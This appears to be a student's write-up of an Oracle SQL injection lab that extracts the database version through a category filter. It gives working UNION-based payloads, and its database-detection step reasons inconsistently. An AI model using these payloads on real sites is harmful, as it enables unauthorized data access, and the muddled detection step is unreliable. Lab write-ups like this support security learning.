## 🧭 My Step-by-Step Approach: SQL Injection Lab (Oracle DB)

### 🔍 Goal:
Exploit a SQL injection vulnerability in the **product category filter** to **retrieve the database version string**.

Here’s how I approached solving the lab — from initial detection to final exploitation — while adapting to Oracle-specific syntax requirements.

### ✅ Step 1: Check for SQL Injection Vulnerability

**What I did:**
Injected a single quote `'` into the category parameter:

```http
GET /filter?category='
```

**Why:**  
To check if the input is vulnerable. If it causes an error or breaks the page → ✅ SQL injection is possible.

**Outcome:**  
✅ The query broke → Confirmed SQL injection point exists.

### ✅ Step 2: Determine Number of Columns Returned by Original Query

**What I did:**
Used `ORDER BY` to guess how many columns the original query returns:

```http
GET /filter?category='+ORDER+BY+1--
```
```http
GET /filter?category='+ORDER+BY+2--
```
```http
GET /filter?category='+ORDER+BY+3--
```

When `ORDER BY 3` caused an error, but `ORDER BY 2` didn't → Confirmed there are **2 columns**.

Then tried using `UNION SELECT` to confirm:

```http
GET /filter?category='+UNION+SELECT+NULL,NULL-- 
```

❌ **But this failed** — no result or error shown.

**Why It Failed:**  
Because the backend was **Oracle**, which requires every `SELECT` statement to include a `FROM` clause — even in injected queries.

**Outcome:**  
✅ Found that the query has **2 columns** via `ORDER BY`.  
❌ `UNION SELECT` failed due to Oracle syntax rules.

### ⚠️ Step 3: Realize It's an Oracle DB and Adapt Strategy

**What I did:**  
Realized that standard `UNION SELECT` payloads work on MySQL/PostgreSQL but **not on Oracle** unless they include `FROM`.

So I adjusted my payload to use Oracle's dummy table `dual`:

```http
GET /filter?category='+UNION+SELECT+NULL,NULL+FROM+dual-- 
```

✅ This worked!

Now tested which column displays text:

```http
GET /filter?category='+UNION+SELECT+'a',NULL+FROM+dual-- 
```
```http
GET /filter?category='+UNION+SELECT+NULL,'b'+FROM+dual-- 
```

Only `'b'` appeared → ✅ Second column is visible.

**Why This Was Needed:**  
Oracle requires `FROM` in all `SELECT` statements. Failing to include it makes payloads fail silently or throw errors — making it seem like injection doesn’t work when it actually does.

**Outcome:**  
✅ Confirmed second column shows output.  
✅ Adjusted payloads to match Oracle syntax.

### ✅ Step 4: Try to Identify the Database Type

**What I did:**  
Injected known DB-specific values to identify the backend:

```http
GET /filter?category='+UNION+SELECT+'MySQL','test'+FROM+dual-- 
```
```http
GET /filter?category='+UNION+SELECT+'PostgreSQL',NULL+FROM+dual-- 
```

None showed up → Not MySQL or PostgreSQL.

Tried again with Oracle-style response:

```http
GET /filter?category='+UNION+SELECT+'OracleDB',NULL+FROM+dual-- 
```

✅ Succeeded → Confirmed backend is **Oracle**.

**Why:**  
Each database behaves differently. Knowing how to test for each one helps you adapt your payloads accordingly.

**Outcome:**  
✅ Identified backend as **Oracle**.

### ✅ Step 5: Try Alternate Queries If Initial DB Detection Fails

**What I did (hypothetically):**  
If the above had failed, I would have tried injecting DB-specific functions like:

- MySQL: `@@version`, `database()`
- PostgreSQL: `version()`, `current_user`
- Oracle: Use system views like `v$version`, `dual`

This helps confirm the exact DB engine when results are unclear.

**Why:**  
Different databases expose version info differently. Knowing how each behaves helps adapt your payload.

**Outcome:**  
✅ Already confirmed it was Oracle, so no need to proceed further.

### ✅ Step 6: Retrieve Database Version String

**What I did:**  
Used Oracle's built-in view `v$version` to retrieve the version info.

Injected this payload:

```http
GET /filter?category='+UNION+SELECT+NULL,BANNER+FROM+v$version-- 
```

**Why:**  
- `BANNER` is a column in `v$version` that contains version details.
- Placed it in the **second column** since only that one is visible.

**Outcome:**  
✅ Got output like:
```
Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production
```

Lab complete!

## 📋 Summary of My Full Approach

| Step | Action | Outcome |
|------|--------|---------|
| 1 | Inject `'` to detect vuln | ✅ SQL injection point found |
| 2 | Use `ORDER BY` to find column count | ✅ 2 columns exist |
| 3 | Try `UNION SELECT` → fails due to missing `FROM` | ❌ Oracle requires `FROM dual` |
| 4 | Fix payload with `FROM dual` and test visibility | ✅ Second column visible |
| 5 | Try DB-specific payloads to identify backend | ✅ Backend is Oracle |
| 6 | (Optional) Try alternate syntax if unsure | ✅ Confirmed Oracle |
| 7 | Inject query to get version from `v$version` | ✅ Retrieved Oracle version |

## 🧠 Final Notes

- **Oracle is strict** about requiring `FROM dual` in every `SELECT`. Forgetting it makes payloads fail silently.
- Always start with `ORDER BY` to determine column count before trying complex payloads.
- Understanding **how different databases behave** is key to adapting your attack.

